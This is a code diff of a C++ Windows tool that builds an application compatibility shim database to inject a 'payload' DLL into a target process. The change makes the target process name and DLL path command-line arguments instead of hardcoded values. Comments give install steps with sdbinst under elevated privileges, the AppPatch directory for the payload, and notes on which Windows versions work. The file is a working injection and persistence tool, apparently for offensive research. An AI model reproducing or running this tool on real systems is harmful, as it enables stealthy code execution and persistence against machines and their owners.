@@ -1,12 +1,14 @@
-// creates a shim database (.sdb) file
-// the database can be installed using the "sdbinst <*.sdb>" command which requires elevated privileges
-// based on: https://gist.github.com/w4kfu/95a87764db7029e03f09d78f7273c4f4, https://www.blackhat.com/docs/eu-15/materials/eu-15-Pierce-Defending-Against-Malicious-Application-Compatibility-Shims-wp.pdf
-// Windows 7 64 bit (copy payload_dll.dll to: C:\Windows\AppPatch\AppPatch64\dll_payload.dll)
-// Windows 7 32bit works only using "Compatability Adminstrator 32 bit" and not on calc.exe (tested working with x32dbg.exe, pafish.exe)
-//  - own implementation loads dll (sysinternals ProcMon) but crashes process
-// Windows 10 WoW64 works when using the "Compatability Adminstrator 32 bit" to apply the "InjectDll" fix. That fix is not available in 64 bit.
-//  - own implemenation does not load dll
+/** Creates a shim database(.sdb) file the database can be installed using the "sdbinst <*.sdb>" command which requires elevated privileges
 
+* Windows 7 64 bit (copy payload_dll.dll to: C:\Windows\AppPatch\AppPatch64\dll_payload.dll)
+* Windows 7 32bit works only using "Compatability Adminstrator 32 bit" and not on calc.exe (tested working with x32dbg.exe, pafish.exe)
+*  - own implementation loads dll (sysinternals ProcMon) but crashes process
+* Windows 10 WoW64 works when using the "Compatability Adminstrator 32 bit" to apply the "InjectDll" fix. That fix is not available in 64 bit.
+*  - own implemenation does not load dll
+* [Requirements]
+*   - elevated privileges to installs shim
+* Based on: https://gist.github.com/w4kfu/95a87764db7029e03f09d78f7273c4f4, https://www.blackhat.com/docs/eu-15/materials/eu-15-Pierce-Defending-Against-Malicious-Application-Compatibility-Shims-wp.pdf
+*/
 
 // sdbinst creates registry keys:
 //  HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom
@@ -21,9 +23,6 @@
 
 #include <windows.h>
 #include <stdio.h>
-
-#define PAYLOAD_DLL         L"dll_payload.dll"
-#define TARGET_EXECUTABLE   L"calc.exe"
 
 #ifdef _WIN64
 #define OS_PLATFORM         4 
@@ -86,7 +85,7 @@ fnSdbWriteDWORDTag SdbWriteDWORDTag = nullptr;
 fnSdbWriteStringTag SdbWriteStringTag = nullptr;
 fnSdbWriteNULLTag SdbWriteNULLTag = nullptr;
 
-bool CreateApplicationCompatibilityDatabase()
+bool CreateApplicationCompatibilityDatabase(wchar_t* processNameW, wchar_t* dllNameW)
 {
     PDB shimdb = SdbCreateDatabase(L"shim_injection.sdb", DOS_PATH);
     if (!shimdb)
@@ -106,7 +105,7 @@ bool CreateApplicationCompatibilityDatabase()
     TAGID tIdLibrary = SdbBeginWriteListTag(shimdb, TAG_LIBRARY);
     TAGID tIdShim = SdbBeginWriteListTag(shimdb, TAG_SHIM);
     SdbWriteStringTag(shimdb, TAG_NAME, L"shim_injection_shim");
-    SdbWriteStringTag(shimdb, TAG_DLLFILE, PAYLOAD_DLL);
+    SdbWriteStringTag(shimdb, TAG_DLLFILE, dllNameW);
 
     TAGID tIdInexclude = SdbBeginWriteListTag(shimdb, TAG_INEXCLUDE);
     SdbWriteNULLTag(shimdb, TAG_INCLUDE);
@@ -116,7 +115,7 @@ bool CreateApplicationCompatibilityDatabase()
     SdbEndWriteListTag(shimdb, tIdLibrary);
 
     TAGID tIdExe = SdbBeginWriteListTag(shimdb, TAG_EXE);
-    SdbWriteStringTag(shimdb, TAG_NAME, TARGET_EXECUTABLE);
+    SdbWriteStringTag(shimdb, TAG_NAME, processNameW);
     SdbWriteStringTag(shimdb, TAG_APP_NAME, L"shim_injection_apps");
     SdbWriteBinaryTag(shimdb, TAG_EXE_ID, (BYTE*)binaryTag, strlen(binaryTag));
 
@@ -140,6 +139,19 @@ int main(int argc, char* argv[])
     printf("[Error] - The current implementation only supports 64 bit\n");
     return 1;
 #endif
+
+    if (argc != 3)
+    {
+        printf("Usage: *.exe processName dllPath\n");
+        return 1;
+    }
+
+    wchar_t processNameW[MAX_PATH + 1];
+    mbstowcs_s(nullptr, processNameW, strlen(argv[1]) + 1, argv[1], MAX_PATH);
+
+    wchar_t payloadDllW[MAX_PATH + 1];
+    mbstowcs_s(nullptr, payloadDllW, strlen(argv[2]) + 1, argv[2], MAX_PATH);
+
     HMODULE appHelpDllHandle = LoadLibraryA("apphelp.dll");
     if (!appHelpDllHandle) 
     {
@@ -158,13 +170,14 @@ int main(int argc, char* argv[])
     SdbWriteStringTag = (fnSdbWriteStringTag)GetProcAddress(appHelpDllHandle, "SdbWriteStringTag");
     SdbWriteNULLTag = (fnSdbWriteNULLTag)GetProcAddress(appHelpDllHandle, "SdbWriteNULLTag");
 
-    if (!SdbBeginWriteListTag || !SdbCloseDatabaseWrite || !SdbCreateDatabase || !SdbEndWriteListTag || !SdbWriteBinaryTag || !SdbWriteDWORDTag || !SdbWriteStringTag || !SdbWriteNULLTag)
+    if (!SdbBeginWriteListTag || !SdbCloseDatabaseWrite || !SdbCreateDatabase || !SdbEndWriteListTag || 
+        !SdbWriteBinaryTag || !SdbWriteDWORDTag || !SdbWriteStringTag || !SdbWriteNULLTag)
     {
         printf("[Error] %d - Failed to resolve a Sdb function in apphelp.dll\n", GetLastError());
         return 1;
     }
 
-    if (!CreateApplicationCompatibilityDatabase())
+    if (!CreateApplicationCompatibilityDatabase(processNameW, payloadDllW))
     {
         printf("[Error] - Failed to create compatibility patch database\n");
         return 1;
